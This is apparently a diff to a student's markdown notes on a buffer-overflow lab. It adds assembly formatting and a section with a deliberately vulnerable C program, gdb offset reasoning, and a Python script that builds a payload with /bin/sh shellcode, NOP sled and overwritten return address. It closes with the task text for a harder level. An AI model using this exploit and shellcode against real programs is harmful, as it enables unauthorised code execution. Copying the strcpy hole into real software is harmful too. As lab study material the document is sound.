@@ -52,7 +52,7 @@ There are many techniques that can get rid of zeros from the shellcode:
 <details>
 <summary>xoring the 32-bit registers and pushing it to the stack</summary>
 
-  ```
+  ```assembly
   xor eax eax
   push eax
   ```
@@ -62,7 +62,7 @@ There are many techniques that can get rid of zeros from the shellcode:
 <details>
 <summary>assigning an 8-bit number to one of the 8-bits registers</summary>
 
-  ```
+  ```assembly
   xor eax eax
   mov al, 0x99
   push eax
@@ -73,7 +73,7 @@ There are many techniques that can get rid of zeros from the shellcode:
 <details>
 <summary>using bit-shift to replace filler characters i.e. to turn "xyz#" into "xyz\0"</summary>
 
-  ```
+  ```assembly
   ;for computers that are little endian i.e. like reading from right to left
   mov eax "xyz#"
   shl eax, 8
@@ -349,6 +349,143 @@ is done through the syscall instruction, and the first three arguments for the s
 <br>
 
 ###  Launching Attack on 32-bit Program When the Buffer Size is Known
+
+When exploiting buffer-overflow vulnerability, to be successful, you need to know the distance between the buffer's starting position and where the return-address is stored.
+
+When the vulnerable program is run, our malicious code is copied on the stack, however, we do not know the memory address of the buffer and base-pointer. Since the source code is available to us, we know the buffer size from the code and we can compile it with gcc `-g` flag so debugging information can be added to the binary. 
+
+<details>
+<summary>Book code for vulnerable program</summary>
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* Changing this size will change the layout of the stack.
+ * Instructors can change this value each year, so students
+ * won't be able to use the solutions from the past.
+ */
+#ifndef BUF_SIZE
+#define BUF_SIZE 100
+#endif
+
+void dummy_function(char *str);
+
+int bof(char *str)
+{
+    char buffer[BUF_SIZE];
+
+    // The following statement has a buffer overflow problem 
+    strcpy(buffer, str);       
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+
+    badfile = fopen("badfile", "r"); 
+    if (!badfile) {
+       perror("Opening badfile"); exit(1);
+    }
+
+    int length = fread(str, sizeof(char), 517, badfile);
+    printf("Input size: %d\n", length);
+    dummy_function(str);
+    fprintf(stdout, "==== Returned Properly ====\n");
+    return 1;
+}
+
+// This function is used to insert a stack frame of size 
+// 1000 (approximately) between main's and bof's stack frames. 
+// The function itself does not do anything. 
+void dummy_function(char *str)
+{
+    char dummy_buffer[1000];
+    memset(dummy_buffer, 0, 1000);
+    bof(str);
+}
+```
+
+</details>
+
+Now we can get the required values needed to prepare the exploit by running gdb
+
+**image**
+
+```
+the return address is stored in &buffer + 4
+thus the first address we can jump to is &buffer + 8 (this is the memory region that will be filled with NOPs).
+This then becomes the value for our return address.
+
+likewise, we can get the differnce between $ebp and &buffer ($ebp - &buffer).
+This means that the return address is stored in $ebp + ($ebp - &buffer) + 4.
+Thus the first address we can jump to is $ebp + ($ebp - &buffer) + 8.
+```
+
+Thus the following code can be used to exploit the buffer-overflow vulnerability (Note: address randomization is disabled)
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+   "\xeb\x15\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
+   "\x08\x31\xd2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff\x2f\x62\x69\x6e"
+   "\x2f\x73\x68\x2a\x41\x41\x41\x41\x42\x42\x42\x42"
+).encode('latin-1')
+
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)               # Change this number 
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+ret    = 0xffffcb38 + 130           # Change this number 
+offset = 112              # Change this number 
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+<details>
+<summary>Brief explanation of exploit code</summary>
+###
+</details>
+
+
+<br>
+
+###  Launching Attack without Knowing Buffer Size (Level 2)
+
+In the Level-1 attack, using gdb, we get to know the size of the buffer. In the real world, this piece of
+information may be hard to get. For example, if the target is a server program running on a remote machine,
+we will not be able to get a copy of the binary or source code. In this task, we are going to add a constraint:
+you can still use gdb, but you are not allowed to derive the buffer size from your investigation. Actually,
+the buffer size is provided in Makefile, but you are not allowed to use that information in your attack.
+Your task is to get the vulnerable program to run your shellcode under this constraint. We assume that
+you do know the range of the buffer size, which is from 100 to 200 bytes. Another fact that may be useful
+to you is that, due to the memory alignment, the value stored in the frame pointer is always multiple of four
+(for 32-bit programs).
+Please be noted, you are only allowed to construct one payload that works for any buffer size within this
+range. You will not get all the credits if you use the brute-force method, i.e., trying one buffer size each
+time. The more you try, the easier it will be detected and defeated by the victim. That’s why minimizing the
+number of trials is important for attacks. In your lab report, you need to describe your method, and provide
+evidences.
 
 
 
